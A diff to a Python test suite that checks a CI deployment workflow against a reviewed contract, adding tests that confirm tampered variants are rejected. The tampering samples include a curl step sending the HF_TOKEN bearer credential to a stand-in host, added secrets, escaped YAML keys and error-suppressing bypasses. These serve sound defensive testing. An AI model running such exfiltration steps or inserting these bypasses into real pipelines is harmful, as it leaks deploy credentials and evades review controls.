@@ -27,6 +27,16 @@ UNFILTERED_MAIN_PUSH = textwrap.dedent(
     on:
       push:
         branches: [main]
+    permissions:
+      contents: read
+    concurrency:
+      group: sync-relock-canonical-a11oy
+      cancel-in-progress: false
+    env:
+      GH_TOKEN: ${{ github.token }}
+      CANONICAL_SPACE: SZLHOLDINGS/a11oy
+      CANONICAL_ORIGIN: https://szlholdings-a11oy.hf.space
+      REPORT_PATH: reports/canonical-a11oy-relock-v4.json
     """
 )
 
@@ -46,6 +56,20 @@ class SourceDerivedCopySyncTests(unittest.TestCase):
             "ayllu/keys/council-runtime-2026-07-21.pub",
             "szl_dsse.py",
             "a11oy_signing_key.py",
+            ".github/scripts/verify_platform_candidate_preview.py",
+            "scripts/witness_platform_candidate_preview.py",
+            ".github/requirements/platform-candidate-browser.txt",
+            ".github/scripts/publish_readiness_verdict.py",
+            "tools/readiness-harness/probe_runner.mjs",
+            "tools/readiness-harness/canonical_unavailable.mjs",
+            "tools/readiness-harness/tabs.json",
+            ".github/scripts/verify_canonical_a11oy.py",
+            ".github/scripts/collect_execution_readiness.py",
+            ".github/scripts/materialize_execution_authority_pins.py",
+            "szl_execution_readiness.py",
+            "observer_adapters.py",
+            "tools/__init__.py",
+            "tools/execution_acceptance.py",
         )}
         cls.deploy_needs = "[source-admission, preflight]"
         cls.deploy_if = "${{ needs.source-admission.outputs.publish == 'true' && needs.preflight.result == 'success' && needs.preflight.outputs.publish == 'true' }}"
@@ -70,21 +94,140 @@ class SourceDerivedCopySyncTests(unittest.TestCase):
     def fixture_contract(self, workflow: str, **inputs) -> bool:
         # Existing controller/COPY/trigger fixtures now use the reviewed graph.
         # Actual workflow and bypass mutations use strict_contract unchanged.
-        if "\n  source-admission:\n" not in workflow:
+        synthetic = "\n  source-admission:\n" not in workflow
+        if synthetic:
+            if "\npermissions:\n" not in workflow:
+                inherited = textwrap.dedent(
+                    """
+                    permissions:
+                      contents: read
+                    concurrency:
+                      group: sync-relock-canonical-a11oy
+                      cancel-in-progress: false
+                    env:
+                      GH_TOKEN: ${{ github.token }}
+                      CANONICAL_SPACE: SZLHOLDINGS/a11oy
+                      CANONICAL_ORIGIN: https://szlholdings-a11oy.hf.space
+                      REPORT_PATH: reports/canonical-a11oy-relock-v4.json
+                    """
+                )
+                workflow = workflow.replace("\njobs:\n", "\n" + inherited + "jobs:\n", 1)
             jobs = "".join(self.fixture_job(name) + "\n" for name in (
-                "source-admission", "preflight", "runtime-config"))
+                "source-admission", "preflight", "runtime-config",
+                "readiness-verdict", "execution-readiness", "relock"))
             workflow = workflow.replace("\njobs:\n", "\njobs:\n" + jobs, 1)
             workflow = workflow.replace("\n  deploy:\n", "\n  deploy:\n"
                 + "    needs: " + self.deploy_needs + "\n"
                 + "    if: " + self.deploy_if + "\n", 1)
-            workflow = re.sub(r"(?m)^    with:$", "    with:\n"
-                + "      require-default-branch-tip: true", workflow)
+            deploy_match = re.search(
+                r"(?ms)^  deploy:\n.*?(?=^  [A-Za-z0-9_-]+:\n|\Z)", workflow
+            )
+            if deploy_match:
+                block = deploy_match.group(0)
+                if not re.search(r"(?m)^    name:", block):
+                    block = block.replace(
+                        "  deploy:\n",
+                        "  deploy:\n"
+                        "    name: Deploy, source-bind, and attest exact surface\n",
+                        1,
+                    )
+                reviewed = self.fixture_job("deploy")
+                reviewed_with = reviewed.split("    with:\n", 1)[1].split(
+                    "    secrets:\n", 1
+                )[0]
+                expected_rows = [
+                    line for line in reviewed_with.splitlines()
+                    if re.match(r"^      [A-Za-z_][A-Za-z0-9_-]*:", line)
+                ]
+                present = {
+                    match.group(1)
+                    for match in re.finditer(
+                        r"(?m)^      ([A-Za-z_][A-Za-z0-9_-]*):", block
+                    )
+                }
+                missing = [
+                    line for line in expected_rows
+                    if line.strip().split(":", 1)[0] not in present
+                    and line.strip().split(":", 1)[0]
+                    not in {"hf-repo", "ref", "dockerfile-path"}
+                ]
+                if missing and "    with:\n" in block:
+                    block = block.replace(
+                        "    with:\n", "    with:\n" + "\n".join(missing) + "\n", 1
+                    )
+                if not re.search(r"(?m)^    secrets:", block):
+                    block = block.rstrip() + (
+                        "\n    secrets:\n"
+                        "      HF_TOKEN: ${{ secrets.HF_ORG_TOKEN || secrets.HF_TOKEN }}\n"
+                    )
+                workflow = (
+                    workflow[:deploy_match.start()]
+                    + block
+                    + workflow[deploy_match.end():]
+                )
             inputs.setdefault("ownership_helper", self.ownership)
         inputs.setdefault("deploy_helpers", self.deploy_helpers)
         return CHECKER.has_source_derived_deploy_contract(workflow, **inputs)
 
     def test_reviewed_workflow_is_recognized(self) -> None:
         self.assertTrue(self.strict_contract(self.reviewed_workflow))
+
+    def test_inherited_provider_context_is_exact_and_has_no_run_defaults(self) -> None:
+        mutations = (
+            ("  CANONICAL_SPACE: SZLHOLDINGS/a11oy",
+             "  CANONICAL_SPACE: OTHER/a11oy"),
+            ("  CANONICAL_ORIGIN: https://szlholdings-a11oy.hf.space",
+             "  CANONICAL_ORIGIN: https://example.invalid"),
+            ("  GH_TOKEN: ${{ github.token }}", "  GH_TOKEN: forged"),
+            ("  REPORT_PATH: reports/canonical-a11oy-relock-v4.json",
+             "  REPORT_PATH: /tmp/forged.json"),
+            ("permissions:\n  contents: read",
+             "permissions:\n  contents: write"),
+            ("  group: sync-relock-canonical-a11oy",
+             "  group: arbitrary-provider-writes"),
+            ("  cancel-in-progress: false", "  cancel-in-progress: true"),
+            ("\nenv:\n", "\ndefaults:\n  run:\n    shell: bash {0} || true\nenv:\n"),
+            ("\nenv:\n", "\ndefaults:\n  run:\n    working-directory: unreviewed\nenv:\n"),
+            ("  CANONICAL_SPACE: SZLHOLDINGS/a11oy\n",
+             "  CANONICAL_SPACE: SZLHOLDINGS/a11oy\n"
+             "  CANONICAL_SPACE: OTHER/a11oy\n"),
+            ("\nenv:\n", "\nenv: *unreviewed\n"),
+            ("\nenv:\n", "\nenv:\n  <<: *unreviewed\n"),
+        )
+        for before, after in mutations:
+            with self.subTest(after=after):
+                self.assertIn(before, self.reviewed_workflow)
+                self.assertFalse(self.strict_contract(
+                    self.reviewed_workflow.replace(before, after, 1)))
+
+    def test_provider_workflow_event_scope_is_exact(self) -> None:
+        anchor = "\npermissions:\n"
+        self.assertIn(anchor, self.reviewed_workflow)
+        additions = (
+            "  pull_request_target:\n    branches: [main]\n",
+            "  schedule:\n    - cron: '0 3 * * *'\n",
+            "  repository_dispatch:\n    types: [deploy]\n",
+        )
+        for addition in additions:
+            with self.subTest(addition=addition):
+                changed = self.reviewed_workflow.replace(
+                    anchor, "\n" + addition + "permissions:\n", 1
+                )
+                self.assertFalse(self.strict_contract(changed))
+
+        changed_default = self.reviewed_workflow.replace(
+            "      open_deploy_window:\n"
+            "        description: Operator-attested maintenance window. Until durable storage lands, a deploy onto a running or crashed Space proceeds only when true (a PAUSED Space is itself the window).\n"
+            "        type: boolean\n"
+            "        default: false\n",
+            "      open_deploy_window:\n"
+            "        description: Operator-attested maintenance window. Until durable storage lands, a deploy onto a running or crashed Space proceeds only when true (a PAUSED Space is itself the window).\n"
+            "        type: boolean\n"
+            "        default: true\n",
+            1,
+        )
+        self.assertNotEqual(changed_default, self.reviewed_workflow)
+        self.assertFalse(self.strict_contract(changed_default))
 
     def test_ungated_and_source_only_deploy_cannot_bypass_preflight(self) -> None:
         workflow = self.reviewed_workflow
@@ -144,7 +287,9 @@ class SourceDerivedCopySyncTests(unittest.TestCase):
             ("needs.source-admission.outputs.publish == 'true'", "true"),
             ("needs.source-admission.result == 'success' && ", "github.run_attempt == 1 && needs.source-admission.result == 'success' && "),
             ("    runs-on:", "    continue-on-error: true\n    runs-on:"),
-            ("python -B .github/scripts/resume_hf_space.py", "python -B scripts/unreviewed_restart.py"),
+            ("python -I -B .github/scripts/resume_hf_space.py", "python -B .github/scripts/resume_hf_space.py"),
+            ("python -I -m pip install --disable-pip-version-check",
+             "python -m pip install --disable-pip-version-check"),
             ('--github-output "$GITHUB_OUTPUT"\n', '--github-output "$GITHUB_OUTPUT" --restart\n'),
             ("echo 'converged=true' >> \"$GITHUB_OUTPUT\"", "echo 'converged=false' >> \"$GITHUB_OUTPUT\""),
             ("scripts/hf_exact_main_ownership.py", "scripts/unreviewed_ownership.py"),
@@ -178,12 +323,109 @@ class SourceDerivedCopySyncTests(unittest.TestCase):
             ('            "${mode[@]}" --output "$GDW_CONFIG_REPORT"\n',
              '            "${mode[@]}" --output "$GDW_CONFIG_REPORT"\n          python -B scripts/prove_hf_series_a_restart.py --source-sha "$GITHUB_SHA" --output /tmp/proof.json\n'),
             ("            ${{ env.GDW_CONFIG_REPORT }}\n", "            ${{ runner.temp }}/**\n"),
-            ("python -B .github/scripts/await_hf_runtime_serving.py", "true"),
+            ("python -I -B .github/scripts/await_hf_runtime_serving.py", "true"),
+            ("python -I -B .github/scripts/await_hf_runtime_serving.py",
+             "python -B .github/scripts/await_hf_runtime_serving.py"),
         )
         for before, after in mutations:
             with self.subTest(after=after):
                 self.assertIn(before, job)
                 changed = self.reviewed_workflow.replace(job, job.replace(before, after, 1), 1)
+                self.assertFalse(self.strict_contract(changed))
+
+    def test_readiness_verifier_is_exact_and_has_no_provider_credential(self) -> None:
+        job = self.fixture_job("readiness-verdict")
+        self.assertNotIn("HF_TOKEN", job)
+        self.assertNotIn("secrets.", job)
+        mutations = (
+            ("    needs: runtime-config\n", "    needs: deploy\n"),
+            ("    runs-on: ubuntu-latest\n",
+             "    continue-on-error: true\n    runs-on: ubuntu-latest\n"),
+            ("      contents: read\n", "      contents: write\n"),
+            ("          ref: ${{ github.sha }}\n", "          ref: main\n"),
+            ("          persist-credentials: false\n",
+             "          persist-credentials: true\n"),
+            ("python -I -B .github/scripts/verify_platform_candidate_preview.py",
+             "python -B .github/scripts/verify_platform_candidate_preview.py"),
+            ("python -I -B .github/scripts/verify_platform_candidate_preview.py",
+             "python -I -B scripts/unreviewed_candidate_probe.py"),
+            ("--expected-contract-file serve.py",
+             "--expected-source-revision deadbeef"),
+            ('--base-url "https://a-11-oy.com"',
+             '--base-url "https://example.invalid"'),
+            ("    env:\n", "    env:\n      HF_TOKEN: ${{ secrets.HF_TOKEN }}\n"),
+        )
+        for before, after in mutations:
+            with self.subTest(after=after):
+                self.assertIn(before, job)
+                changed = self.reviewed_workflow.replace(
+                    job, job.replace(before, after, 1), 1)
+                self.assertFalse(self.strict_contract(changed))
+
+    def test_readiness_success_is_required_before_relock(self) -> None:
+        job = self.fixture_job("relock")
+        exact = "    needs: [runtime-config, execution-readiness]\n"
+        self.assertIn(exact, job)
+        replacements = (
+            "    needs: runtime-config\n",
+            "    needs: execution-readiness\n",
+            "    needs: [execution-readiness, runtime-config]\n",
+            exact + "    if: ${{ always() }}\n",
+            exact + "    continue-on-error: true\n",
+            exact + "    <<: *unreviewed\n",
+            exact + '    "\\u0069f": ${{ always() }}\n',
+            exact + '    "\\x69f": ${{ always() }}\n',
+        )
+        for replacement in replacements:
+            with self.subTest(replacement=replacement):
+                changed = self.reviewed_workflow.replace(
+                    job, job.replace(exact, replacement, 1), 1)
+                self.assertFalse(self.strict_contract(changed))
+
+    def test_execution_collection_cannot_gain_effects_or_cross_job_credentials(self) -> None:
+        job = self.fixture_job("execution-readiness")
+        self.assertNotIn("HF_TOKEN", job)
+        mutations = (
+            ("    needs: readiness-verdict\n", "    needs: runtime-config\n"),
+            ("    needs: readiness-verdict\n", "    needs: readiness-verdict\n    if: ${{ always() }}\n"),
+            ("    env:\n", "    env:\n      A11OY_CODE_ADMIN_KEY: ${{ secrets.A11OY_CODE_ADMIN_KEY }}\n"),
+            ("      actions: read\n", "      actions: write\n"),
+            ("python -I -B .github/scripts/collect_execution_readiness.py",
+             "python -I -B scripts/execute_acceptance_plan.py"),
+            ("python -I -B .github/scripts/collect_execution_readiness.py",
+             "python -B .github/scripts/collect_execution_readiness.py"),
+            ("          A11OY_CODE_ADMIN_KEY: ${{ secrets.A11OY_CODE_ADMIN_KEY }}\n",
+             "          A11OY_CODE_ADMIN_KEY: ${{ secrets.HF_TOKEN }}\n"),
+            ("canonical-a11oy-passive-${{ github.run_id }}-${{ github.run_attempt }}",
+             "canonical-a11oy-passive-${{ github.run_id }}-1"),
+            ("            ${{ runner.temp }}/execution-evidence/execution-observations.json\n",
+             "            ${{ runner.temp }}/execution-evidence/**\n"),
+            ("      EXPECTED_EXECUTION_BOOT_ID: ${{ vars.A11OY_EXECUTION_BOOT_ID }}\n",
+             "      EXPECTED_EXECUTION_BOOT_ID: ${{ steps.gate.outputs.boot_id }}\n"),
+            ("          --validate-only\n", ""),
+            ("          --expected-run-nonce \"$EXPECTED_EXECUTION_RUN_NONCE\"\n",
+             "          --expected-run-nonce \"$EXPECTED_EXECUTION_RUN_NONCE\" || true\n"),
+        )
+        for original, replacement in mutations:
+            with self.subTest(replacement=replacement):
+                self.assertIn(original, job)
+                changed = self.reviewed_workflow.replace(job, job.replace(original, replacement, 1), 1)
+                self.assertFalse(self.strict_contract(changed))
+
+    def test_escaped_push_filter_keys_cannot_hide_from_the_guard(self) -> None:
+        anchor = "    branches: [main]\n"
+        self.assertIn(anchor, self.reviewed_workflow)
+        additions = (
+            '    "\\u0070aths": [README.md]\n',
+            '    "\\x70aths": [README.md]\n',
+            "    ? paths\n    : [README.md]\n",
+            "    &filter paths: [README.md]\n",
+        )
+        for addition in additions:
+            with self.subTest(addition=addition):
+                changed = self.reviewed_workflow.replace(
+                    anchor, anchor + addition, 1
+                )
                 self.assertFalse(self.strict_contract(changed))
 
     def test_retired_incident_jobs_cannot_reenter_the_graph(self) -> None:
@@ -194,16 +436,77 @@ class SourceDerivedCopySyncTests(unittest.TestCase):
                 self.assertFalse(self.strict_contract(self.reviewed_workflow.rstrip("\n") + "\n\n" + retired))
 
     def test_missing_duplicate_jobs_and_duplicate_controller_fields_fail(self) -> None:
-        for name in ("source-admission", "preflight", "runtime-config", "deploy"):
+        for name in ("source-admission", "preflight", "runtime-config",
+                     "readiness-verdict", "execution-readiness", "relock", "deploy"):
             job = self.fixture_job(name)
             self.assertFalse(self.strict_contract(self.reviewed_workflow.replace(job, "", 1)))
             self.assertFalse(self.strict_contract(self.reviewed_workflow + "\n" + job))
+        escaped_relock = self.fixture_job("relock").replace(
+            "  relock:\n", '  "\\u0072elock":\n', 1
+        )
+        self.assertFalse(self.strict_contract(
+            self.reviewed_workflow + "\n" + escaped_relock))
         deploy = self.fixture_job("deploy")
         for header in ("    needs: " + self.deploy_needs + "\n", "    if: " + self.deploy_if + "\n",
                        "    uses: szl-holdings/.github/.github/workflows/reusable-hf-deploy.yml@fc71ae973a0f31b8e9ee793fc8545a354448d451\n",
-                       "    <<: *hidden\n", "    continue-on-error: true\n"):
+                       "    <<: *hidden\n", "    continue-on-error: true\n",
+                       "    ? continue-on-error\n    : true\n",
+                       "    &bypass continue-on-error: true\n"):
             self.assertFalse(self.strict_contract(self.reviewed_workflow.replace(deploy,
                 deploy.replace("  deploy:\n", "  deploy:\n" + header, 1), 1)))
+
+    def test_deploy_authority_scope_is_exact(self) -> None:
+        deploy = self.fixture_job("deploy")
+        secret = (
+            "    secrets:\n"
+            "      HF_TOKEN: ${{ secrets.HF_ORG_TOKEN || secrets.HF_TOKEN }}\n"
+        )
+        self.assertIn(secret, deploy)
+        mutations = (
+            deploy.replace(secret, "    secrets: inherit\n", 1),
+            deploy.replace(
+                secret,
+                secret + "      EXTRA: ${{ secrets.EXTRA_SECRET }}\n",
+                1,
+            ),
+            deploy.replace("  deploy:\n", "  deploy:\n    permissions:\n      contents: write\n", 1),
+            deploy.replace("  deploy:\n", "  deploy:\n    environment: production\n", 1),
+            deploy.replace("  deploy:\n", "  deploy:\n    timeout-minutes: 1440\n", 1),
+            deploy.replace(
+                "      include-readme: true\n",
+                "      include-readme: true\n      unreviewed-effect: true\n",
+                1,
+            ),
+        )
+        for changed_deploy in mutations:
+            with self.subTest(changed=changed_deploy):
+                changed = self.reviewed_workflow.replace(deploy, changed_deploy, 1)
+                self.assertFalse(self.strict_contract(changed))
+
+    def test_relock_credential_scope_is_exact(self) -> None:
+        relock = self.fixture_job("relock")
+        mutations = (
+            relock.replace(
+                "  relock:\n", "  relock:\n    permissions:\n      contents: write\n", 1
+            ),
+            relock.replace(
+                "      SOURCE_SHA: ${{ github.sha }}\n",
+                "      SOURCE_SHA: ${{ github.sha }}\n"
+                "      EXTRA: ${{ secrets.EXTRA_SECRET }}\n",
+                1,
+            ),
+            relock.replace(
+                "    steps:\n",
+                "    steps:\n"
+                "      - run: curl -fsS -H \"authorization: Bearer $HF_TOKEN\" "
+                "https://example.invalid/collect\n",
+                1,
+            ),
+        )
+        for changed_relock in mutations:
+            with self.subTest(changed=changed_relock):
+                changed = self.reviewed_workflow.replace(relock, changed_relock, 1)
+                self.assertFalse(self.strict_contract(changed))
 
     def test_exact_reviewed_source_admission_preserves_copy_coverage(self) -> None:
         workflow = (ROOT / ".github/workflows/hf-sync.yml").read_text(encoding="utf-8")
@@ -363,7 +666,7 @@ class SourceDerivedCopySyncTests(unittest.TestCase):
                 steps:
                   - run: echo no-op
               deploy:
-                name: Exact source-derived deployment
+                name: Deploy, source-bind, and attest exact surface
                 uses: szl-holdings/.github/.github/workflows/reusable-hf-deploy.yml@fc71ae973a0f31b8e9ee793fc8545a354448d451
                 with:
                   hf-repo: SZLHOLDINGS/a11oy
@@ -371,7 +674,7 @@ class SourceDerivedCopySyncTests(unittest.TestCase):
                   dockerfile-path: "Dockerfile"
                   prune: true
                 secrets:
-                  HF_TOKEN: ${{ secrets.HF_TOKEN }}
+                  HF_TOKEN: ${{ secrets.HF_ORG_TOKEN || secrets.HF_TOKEN }}
             """
         )
         self.assertTrue(self.fixture_contract(workflow))
